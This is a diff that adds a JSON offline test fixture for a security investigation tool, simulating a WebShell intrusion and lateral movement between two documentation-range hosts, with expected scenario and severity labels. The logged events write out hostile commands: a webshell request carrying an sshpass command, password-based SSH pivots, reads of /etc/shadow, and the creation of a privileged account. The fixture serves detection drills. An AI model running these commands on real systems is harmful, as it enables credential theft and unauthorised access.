@@ -1,0 +1,143 @@
+{
+  "contract_version": "1.0",
+  "skill": "evidence-fetch",
+  "investigation_intent": "离线样例：192.0.2.91 WebShell + 横向 192.0.2.92（prompt-risk-analysis 黄金路径）",
+  "params": {
+    "hosts": ["192.0.2.91", "192.0.2.92"],
+    "time_start": "2026-07-01T14:00:00+08:00",
+    "time_end": "2026-07-01T18:30:00+08:00"
+  },
+  "bundle_id": "bundle-host-risk-default",
+  "scenario": "S5",
+  "asset_ids": [
+    "asset-secweaver-host-exec",
+    "asset-secweaver-sys-risk-alert"
+  ],
+  "data_access": {
+    "source": "offline_fixture",
+    "fetch_mode": "offline",
+    "bundle_id": "bundle-host-risk-default",
+    "declared_asset_ids": [
+      "asset-secweaver-host-exec",
+      "asset-secweaver-sys-risk-alert"
+    ],
+    "fetch_asset_ids": [
+      "asset-secweaver-host-exec",
+      "asset-secweaver-sys-risk-alert"
+    ]
+  },
+  "evidence_bundles": {
+    "host_exec": [
+      {
+        "evidence_id": "exec-webshell-probe",
+        "event_type": "exec",
+        "host": "192.0.2.91",
+        "timestamp": "2026-07-01T16:46:36+08:00",
+        "listener_process": "sshd",
+        "listener_port": "22",
+        "uid_name": "root",
+        "exe": "/usr/bin/bash",
+        "command_line": "bash -c curl -s --max-time 10 'http://127.0.0.1/uploads/s.phtml?c=sshpass+-p+123456+ssh+devops@192.0.2.92+id'",
+        "command": "[\"bash\",\"-c\",\"curl -s --max-time 10 'http://127.0.0.1/uploads/s.phtml?c=sshpass+-p+123456+ssh+devops@192.0.2.92+id'\"]"
+      },
+      {
+        "evidence_id": "exec-nginx-lateral",
+        "event_type": "exec",
+        "host": "192.0.2.91",
+        "timestamp": "2026-07-01T17:22:50+08:00",
+        "listener_process": "nginx",
+        "listener_port": "80",
+        "uid_name": "nginx",
+        "exe": "/usr/bin/bash",
+        "command_line": "sh -c sshpass -p 123456 ssh -o StrictHostKeyChecking=no devops@192.0.2.92 echo ok",
+        "command": "[\"sh\",\"-c\",\"sshpass -p 123456 ssh -o StrictHostKeyChecking=no devops@192.0.2.92 echo ok\"]"
+      },
+      {
+        "evidence_id": "exec-nginx-shadow",
+        "event_type": "exec",
+        "host": "192.0.2.91",
+        "timestamp": "2026-07-01T17:59:58+08:00",
+        "listener_process": "nginx",
+        "listener_port": "80",
+        "uid_name": "nginx",
+        "exe": "/usr/bin/bash",
+        "command_line": "sh -c cat /etc/shadow 2>&1",
+        "command": "[\"sh\",\"-c\",\"cat /etc/shadow 2>&1\"]"
+      },
+      {
+        "evidence_id": "exec-nginx-lateral-success",
+        "event_type": "exec",
+        "host": "192.0.2.91",
+        "timestamp": "2026-07-01T18:01:43+08:00",
+        "listener_process": "nginx",
+        "listener_port": "80",
+        "uid_name": "nginx",
+        "exe": "/usr/bin/bash",
+        "command_line": "sh -c sshpass -p devops123 ssh devops@192.0.2.92 cat /etc/shadow 2>&1",
+        "command": "[\"sh\",\"-c\",\"sshpass -p devops123 ssh devops@192.0.2.92 cat /etc/shadow 2>&1\"]"
+      },
+      {
+        "evidence_id": "exec-92-shadow-local",
+        "event_type": "exec",
+        "host": "192.0.2.92",
+        "timestamp": "2026-07-01T15:01:40+08:00",
+        "listener_process": "sshd",
+        "listener_port": "22",
+        "uid_name": "devops",
+        "exe": "/usr/bin/bash",
+        "command_line": "bash -c cat /etc/shadow",
+        "command": "[\"bash\",\"-c\",\"cat /etc/shadow\"]"
+      },
+      {
+        "evidence_id": "exec-env-prep",
+        "event_type": "exec",
+        "host": "192.0.2.92",
+        "timestamp": "2026-07-01T14:34:31+08:00",
+        "listener_process": "sshd",
+        "listener_port": "22",
+        "uid_name": "root",
+        "exe": "/usr/bin/bash",
+        "command_line": "bash -c sudo useradd -m -s /bin/bash devops; echo devops:devops123 | sudo chpasswd; sudo usermod -aG wheel devops",
+        "command": "[\"bash\",\"-c\",\"sudo useradd -m -s /bin/bash devops; echo devops:devops123 | sudo chpasswd; sudo usermod -aG wheel devops\"]"
+      }
+    ],
+    "syslog_risk_alert": [
+      {
+        "evidence_id": "sys-account-devops",
+        "event_type": "account_created",
+        "host": "192.0.2.92",
+        "timestamp": "2026-07-01T14:34:31+08:00",
+        "risk_level": "high",
+        "rule_name": "Local account created",
+        "user": "devops",
+        "message": "new user: name=devops, UID=1000, GID=1000, home=/home/devops, shell=/bin/bash"
+      },
+      {
+        "evidence_id": "sys-sudo-useradd",
+        "event_type": "sudo_command",
+        "host": "192.0.2.92",
+        "timestamp": "2026-07-01T14:34:31+08:00",
+        "risk_level": "high",
+        "rule_name": "Sudo command execution",
+        "user": "root",
+        "command": "/sbin/useradd -m -s /bin/bash devops",
+        "message": "root : COMMAND=/sbin/useradd -m -s /bin/bash devops"
+      }
+    ]
+  },
+  "fetch_summary": {
+    "total_events": 8,
+    "by_asset_type": {
+      "host_exec": 6,
+      "syslog_risk_alert": 2
+    },
+    "fetch_mode": "offline"
+  },
+  "_meta": {
+    "fixture_id": "prompt-risk-exec-syslog-mini",
+    "expected_scenario": "S5",
+    "expected_secondary_scenarios": ["S2", "S3"],
+    "expected_highest_severity": "P0",
+    "notes": "Compact offline bundle for prompt-risk-analysis drills; extend with sanitized events under examples/risk-identification/ if needed."
+  }
+}
